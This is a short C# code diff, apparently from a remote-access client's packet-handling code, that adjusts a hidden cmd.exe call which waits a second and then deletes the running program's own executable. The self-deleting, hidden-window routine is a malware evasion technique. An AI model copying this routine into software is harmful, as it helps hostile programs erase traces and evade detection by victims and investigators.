@@ -139,7 +139,7 @@ namespace Client.Handle_Packet
             {
                 Del = new ProcessStartInfo()
                 {
-                    Arguments = "/C choice /C Y /N /D Y /T 2 & Del " + Process.GetCurrentProcess().MainModule.FileName,
+                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true,
                     FileName = "cmd.exe"
